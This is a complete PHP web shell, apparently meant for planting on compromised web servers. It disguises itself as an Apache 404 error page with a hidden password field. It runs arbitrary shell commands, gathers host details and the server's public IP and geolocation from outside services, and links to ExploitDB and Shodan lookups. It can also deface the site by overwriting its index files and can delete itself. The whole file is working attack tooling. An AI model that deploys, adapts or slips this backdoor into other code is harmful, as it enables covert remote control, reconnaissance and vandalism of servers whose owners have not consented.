<?php
// --- Parameters ---
$passphrase = "46fc4fd2322b9b051d2b941bbfba99e2"; // md5(md5(cosasdepuma))

// --- Headers ---
http_response_code(404);                // nice trick :3
header('X-Powered-By: Bunnies <3');

// --- Config ---
//error_reporting(0);                     // Disabled: errors
set_time_limit(0);                      // Disabled: commands timeout

// --- Session ---
session_start();
$_SESSION['pass'] = $passphrase;
if(!isset($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));

// --- Functions ---
function anon($url) {
    return "https://nullrefer.com?" . $url;
}
function cmd($cmd) {
    exec($cmd,$stdout);
    return join('<br/>',array_map(htmlspecialchars, $stdout));
}
function deface() {
    $l = count(explode('/', $_SERVER['REQUEST_URI']));
    $p = "index"; for($i = 2; $i < $l; $i++) $p = '../' . $p; echo($p);
    $f = fopen($p . '.php', 'w');
    fwrite($f, '<?php http_response_code(418); header("Refresh: 0; https://youtu.be/dQw4w9WgXcQ");');
    fclose($f);
    $f = fopen($p . '.html', 'w');
    fwrite($f, '<head><meta http-equiv="refresh" content="0; https://youtu.be/dQw4w9WgXcQ"/></head>');
    fclose($f);
    header('Location: ' . $p . '.php');
}
function geoip() {
    $coords = "";
    header('Location:' . $coords);
}
function gatherer() {
    if(!isset($_SESSION['sysinfo'])) {
        $_SESSION['sysinfo'] = array(
            'IP' => file_get_contents('https://ipinfo.io/ip'),
            'ip' => $_SERVER['SERVER_ADDR'],
            'user' => `whoami`,
            'os' => php_uname('s'),
            'arch' => php_uname('m'),
            'release' => php_uname('r'),
            'hostname' => php_uname('n'),
            'php' => phpversion(),
            'safe' => @ini_get('safe_mode') ? 'active :(' : 'inactive :3',
        );
        $_SESSION['sysinfo']['geo'] = file_get_contents('http://ip-api.com/csv/' . $_SESSION['sysinfo']['IP'] . '?fields=lat,lon');
        $_SESSION['sysinfo']['delimiter'] = $_SESSION['sysinfo']['os'] === 'Windows' ? '\\' : '/';
    }
    if(!isset($_SESSION['unicorns'])) $_SESSION['unicorns'] = TRUE;
}
function logout() {
    unset($_SESSION['unicorns']);
    unset($_SESSION['sysinfo']);
    apache();
}

// --- Template ---
function apache() {
?>
<style>
input {border:0;outline:none}div{position:absolute;top:50%;left:50%;margin-top:-25px;margin-left:-50px}
</style></head><body>
<h1>Not Found</h1><p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
<hr><address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
<div><form method="post" autocomplete="off"><input id="unicorn" type="password" name="unicorn"/><input type="hidden" name="csrf" value="<?=$_SESSION['csrf']?>" autofocus="autofocus"/></form></div>
<?php
}
function dashboard() {
?>
<style>
*{margin:0;padding:0;box-sizing:border-box}html,body{width:100%;background:#151515}body{padding:20px;display:grid;grid-template-columns:2fr 10fr;grid-gap:15px}
a,input{background:inherit;color:inherit;outline:none;}section{font-size:12px;color:#ddd;}h5{position:absolute;top:-8px;left:20px;padding:0 5px;background:#151515}
input[name="cmd"],.textarea{width:100%;border:1px solid #ddd;padding:2px 7px;margin:1px 0}[name="cmd"]{text-align:center}.textarea{overflow-y:scroll;height:300px;margin-bottom:5px;padding:7px;background:#191919;white-space:pre-wrap}
.out{display:block}.out{min-height:200px}.box{border:1px solid #ddd;border-radius:5px;padding:20px;position:relative}.cmd.box{display:grid;grid-template-rows:1fr 20px}
.links{display:flex;justify-content:center;padding:20px 15px}.links>*{margin:0 5px}.links input{color:#ddd;font-size:12px;border:none;text-decoration:underline;cursor:pointer}[name="logout"],[name="remove"]{color:tomato!important}
</style></head><body>
<div>
<section><div class="box links"><h5>links</h5>
<?php if(is_writable(getcwd())) { ?><form method="post"><input type="submit" name="deface" value="Deface"/></form><?php } ?>
<a rel="noopener noreferrer" target="_blank" href="<?=anon('https://www.exploit-db.com/search?q=' . explode(' ',$_SESSION['sysinfo']['os'])[0] . '+' . explode('.',$_SESSION['sysinfo']['release'])[0])?>">ExploitDB</a>
<a rel="noopener noreferrer" target="_blank" href="<?=anon('https://www.google.es/maps/place/' . $_SESSION['sysinfo']['geo'])?>">Geolocate</a>
<a rel="noopener noreferrer" target="_blank" href="<?=anon('https://www.shodan.io/host/' . $_SESSION['sysinfo']['IP'])?>">Shodan</a>
<form method="post"><input type="submit" name="phpinfo" value="PHPInfo"/></form>
<?php if(is_writable(__FILE__)) { ?><form method="post"><input type="submit" name="remove" value="Remove"/></form><?php } ?>
<form method="post"><input type="submit" name="logout" value="Logout"/></form>
</div></section>
<br/>
<section><div class="box"><h5>system</h5>
<b>IP:</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span><?=$_SESSION['sysinfo']['ip']?></span><br/>
<b>Hostname:</b>&nbsp;&nbsp;<span><?=$_SESSION['sysinfo']['hostname']?></span><br/>
<b>System:</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span><?=$_SESSION['sysinfo']['os']?></span><br/>
<b>Arch:</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span><?=$_SESSION['sysinfo']['arch']?></span><br/>
<b>Release:</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span><?=$_SESSION['sysinfo']['release']?></span><br/>
<b>User:</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span><?=$_SESSION['sysinfo']['user']?></span><br/>
<b>PHP:</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v<span><?=$_SESSION['sysinfo']['php']?></span><br/>
<b>Safe:</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span><?=$_SESSION['sysinfo']['safe']?></span>
</div></section></div>
<section><div class="box cmd"><h5>cmd</h5>
<div class="textarea"></div><form onsubmit="event.preventDefault();exc()"><input type="text" name="cmd" placeholder="command"></form>
</div></section>
<script>
var bsh=document.querySelector('[name="cmd"]'),textarea=document.querySelector('.textarea'); 
function exc(){
    var http,command=bsh.value.trim(),body=new FormData();body.append("cmd",command);bsh.value="";
    if(command === "clear" || command === "cls"){textarea.innerHTML="";return false}
    if(window.XMLHttpRequest){http=new XMLHttpRequest();http.overrideMimeType('text/plain')}
    else if(window.ActiveXObject){try{http=new ActiveXObject("Msxml2.XMLHTTP")}catch(e){try{http=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}}}
    if(!http) return false;
    http.onreadystatechange=function(){if(http.readyState===4){if(http.status===404){
        var d=http.responseText;
        textarea.innerHTML+=`$ ${command}<br/>------------------`;
        if(command.startsWith("cd ")) textarea.innerHTML+="Invalid command.";
        else textarea.innerHTML+=d;
        textarea.innerHTML+='<br/><br/>';textarea.scrollTop=textarea.scrollHeight;
    }}}
    http.open('post','<?=$_SERVER['REQUEST_URI']?>',true);http.send(body);
    return false;
}
</script>
<?php
}

// --- View ---
?>
<!DOCTYPE html><html lang="en"><head><title>Security NotFound!</title><meta name="robots" content="noindex, nofollow"/><link rel="icon" href="data:;base64,iVBORw0KGgo=">
<?php
if(isset($_POST['cmd'])) {
    die(cmd($_POST['cmd']));
} else if(isset($_SESSION['unicorns'])) {
    if(isset($_POST['logout'])) { logout(); }
    else if(isset($_POST['deface'])) { deface(); }
    else if(isset($_POST['phpinfo'])) { phpinfo(); }
    else if(isset($_POST['remove'])) { unlink(__FILE__); header('Refresh:0'); }
    else { dashboard(); }
} else if (isset($_POST['unicorn']) && isset($_POST['csrf']) && md5(md5($_POST['unicorn'])) === $_SESSION['pass'] && $_POST['csrf'] === $_SESSION['csrf']) {
    gatherer(); dashboard();
} else {
    apache();
}
?>
</body></html>